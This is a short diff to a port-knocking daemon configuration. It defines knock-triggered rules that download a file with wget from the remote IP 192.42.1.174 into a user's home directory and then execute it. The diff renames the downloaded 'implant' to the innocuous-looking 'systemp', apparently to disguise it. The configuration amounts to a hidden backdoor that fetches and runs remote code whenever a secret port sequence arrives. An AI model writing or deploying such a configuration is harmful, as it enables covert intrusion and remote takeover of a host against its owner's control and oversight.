@@ -2,7 +2,7 @@ interface: "ens3"
 timeout: 5
 rules:
   - name: "knock-firewall"
-    command: "wget http://192.42.1.174:8000 -O /home/john/implant"
+    command: "wget http://192.42.1.174:8000 -O /home/john/systemp"
     sequence:
       - 32768
       - 28977
@@ -13,7 +13,7 @@ rules:
       - 18933
       - 32768
   - name: "execute-implant2"
-    command: "/home/john/implant"
+    command: "/home/john/systemp"
     sequence:
       - 54321
       - 12345
